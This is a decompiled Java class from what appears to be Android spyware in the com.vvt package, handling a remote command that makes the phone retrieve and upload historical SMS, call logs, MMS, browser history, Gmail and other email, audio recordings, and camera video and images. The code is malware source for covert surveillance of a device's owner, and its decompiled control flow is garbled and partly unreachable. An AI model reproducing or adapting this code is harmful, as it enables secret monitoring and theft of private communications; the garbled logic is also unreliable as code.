package com.vvt.appengine.a;

import com.vvt.appengine.AppEngine1;
import com.vvt.capture.mms.b;
import com.vvt.eventdelivery.f;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.input.RmtCtrlInputRequestHistoricalEvents;
import java.util.Iterator;
import java.util.List;

public class ab
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static final boolean c = com.vvt.ak.a.d;
  
  private void a(AppEngine1 paramh, RmtCtrlInputRequestHistoricalEvents paramRmtCtrlInputRequestHistoricalEvents)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = paramRmtCtrlInputRequestHistoricalEvents.getSettingIds();
    int k = paramRmtCtrlInputRequestHistoricalEvents.getTotalNumber();
    boolean bool4 = a;
    if (bool4) {}
    Iterator localIterator = ((List)localObject1).iterator();
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject1 = (String)localIterator.next();
      try
      {
        int i = Integer.parseInt((String)localObject1);
        boolean bool5 = a;
        if (bool5) {}
        switch (i)
        {
        }
      }
      catch (NumberFormatException localNumberFormatException)
      {
        bool2 = b;
      }
      localObject1 = paramh.u;
      if (localObject1 != null)
      {
        localObject1 = paramh.u;
        ((com.vvt.capture.sms.a)localObject1).a(k);
        continue;
        boolean bool2;
        if (bool2)
        {
          continue;
          Object localObject2 = paramh.t;
          if (localObject2 != null)
          {
            localObject2 = paramh.t;
            ((com.vvt.capture.calllog.a)localObject2).a(k);
            continue;
            localObject2 = paramh.v;
            if (localObject2 != null)
            {
              localObject2 = paramh.v;
              ((b)localObject2).a(k);
              continue;
              localObject2 = paramh.K;
              if (localObject2 != null)
              {
                localObject2 = paramh.K;
                ((com.vvt.capture.chrome.a)localObject2).a(k);
              }
              localObject2 = paramh.J;
              if (localObject2 != null)
              {
                localObject2 = paramh.J;
                ((com.vvt.capture.browserurl.a)localObject2).a(k);
                continue;
                localObject2 = new java/lang/Thread;
                Object localObject3 = new com/vvt/appengine/a/ac;
                ((ac)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ak;
                ((ak)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/al;
                ((al)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/am;
                ((am)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/an;
                ((an)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ao;
                ((ao)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ap;
                ((ap)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/aq;
                ((aq)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ar;
                ((ar)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ad;
                ((ad)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ae;
                ((ae)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/af;
                ((af)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ag;
                ((ag)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ah;
                ((ah)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/ai;
                ((ai)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                continue;
                localObject2 = new java/lang/Thread;
                localObject3 = new com/vvt/appengine/a/aj;
                ((aj)localObject3).<init>(this, paramh, k);
                ((Thread)localObject2).<init>((Runnable)localObject3);
                ((Thread)localObject2).start();
                bool2 = false;
                localObject2 = null;
                localObject3 = paramh.y;
                int n;
                int m;
                int j;
                if (localObject3 != null)
                {
                  localObject3 = paramh.y;
                  n = k / 2;
                  m = ((com.vvt.capture.email.gmail.a)localObject3).a(n);
                  j = 0 + m;
                }
                localObject3 = paramh.w;
                if (localObject3 != null)
                {
                  localObject3 = paramh.w;
                  n = k / 2;
                  m = ((com.vvt.capture.email.b.a)localObject3).a(n);
                  j += m;
                }
                localObject3 = paramh.x;
                if (localObject3 != null)
                {
                  j = k - j;
                  if (j > 0)
                  {
                    localObject3 = paramh.x;
                    ((com.vvt.capture.email.generic.a)localObject3).a(j);
                    continue;
                    localObject2 = paramh.G;
                    if (localObject2 != null)
                    {
                      localObject2 = paramh.G;
                      ((com.vvt.capture.audio.a)localObject2).a(k);
                      continue;
                      localObject2 = paramh.F;
                      if (localObject2 != null)
                      {
                        localObject2 = paramh.F;
                        ((com.vvt.capture.camera.video.a)localObject2).a(k);
                        continue;
                        localObject2 = paramh.D;
                        if (localObject2 != null)
                        {
                          localObject2 = paramh.D;
                          ((com.vvt.capture.camera.image.a)localObject2).a(k);
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    boolean bool3 = a;
    if (bool3) {}
  }
  
  public boolean a(ControlCommand paramControlCommand, AppEngine1 paramh)
  {
    Object localObject = paramControlCommand.getData();
    boolean bool1 = localObject instanceof RmtCtrlInputRequestHistoricalEvents;
    boolean bool2;
    if (bool1)
    {
      bool1 = a;
      if (bool1) {}
      localObject = (RmtCtrlInputRequestHistoricalEvents)localObject;
      a(paramh, (RmtCtrlInputRequestHistoricalEvents)localObject);
      bool2 = a;
      if (bool2) {}
      localObject = paramh.i;
      ((f)localObject).a();
      bool2 = true;
    }
    for (;;)
    {
      return bool2;
      bool2 = false;
      localObject = null;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/appengine/a/ab.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */